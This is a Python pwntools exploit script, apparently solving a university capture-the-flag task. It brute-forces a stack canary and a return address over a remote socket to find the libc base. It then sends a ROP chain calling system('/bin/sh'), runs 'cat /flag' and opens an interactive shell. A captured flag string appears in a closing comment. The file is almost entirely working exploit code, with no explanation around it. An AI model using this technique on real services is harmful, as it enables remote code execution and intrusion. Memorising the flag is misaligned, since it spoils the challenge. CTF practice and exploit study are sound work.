from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
#b *(main+498)
#set detach-on-fork off
#set follow-fork-mode child
set follow-fork-mode parent
#catch fork
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33305)

#p=remote("127.0.0.1", 1024)



#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)

#p.sendline(b"1")
#p.sendline(cyclic(0x18)+b"DEADBEEF")

def brute_force_canary(canary_offset):
    canary_bytes = b""
    for i in range(8):
        for j in range(256):
            p.recvuntil(b"(2) Leave\n")
            p.sendline(b"1")
            p.send(cyclic(canary_offset)+canary_bytes+p8(j))
            p.recvline()
            line = p.recvline()
            if b"Sadly, the mine caved in :(" in line:
                continue
            else:
                canary_bytes += p8(j)
                break
        else:
            assert 0
    return canary_bytes

canary_offset = 0x18
canary_bytes = brute_force_canary(canary_offset)

print(canary_bytes)
#input()

def brute_force_ret(canary_bytes):
    ret_bytes = b""
    for i in range(6):
        for j in range(256):
            p.recvuntil(b"(2) Leave\n")
            p.sendline(b"1")
            p.send(b"A"*canary_offset+canary_bytes+b"B"*cyclic_find_bytes(0x61616167)+ret_bytes+p8(j))
            p.recvline()
            line = p.recvline()
            if b"Sadly, the mine caved in :(" in line:
                continue
            else:
                ret_bytes += p8(j)
                break
        else:
            assert 0
    return ret_bytes+b"\x00\x00"

ret_bytes = brute_force_ret(canary_bytes)
print(ret_bytes)
#input()


libc_addr = int.from_bytes(ret_bytes[::-1]) - 160258
print(f"libc_addr: {hex(libc_addr)}")

libc = ELF("./libc.so.6")
libc.address = libc_addr

payload = b"A"*canary_offset+canary_bytes+b"B"*cyclic_find_bytes(0x61616167)
rop = ROP(libc)
rop.raw(pack(rop.ret.address))
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload += rop.chain()
p.sendline(b"1")
p.sendline(payload)

sleep(1)
# see outputted flag
p.sendline(b"cat /flag")
print(p.recvline().decode())
p.interactive()

#softsec{gHSEMdmWFnE2s_Vig0xo-1Lyhwx0pn3Rcp6ib5kQWrcMYBAPNUCupP61OUSffGfl}





#infe 1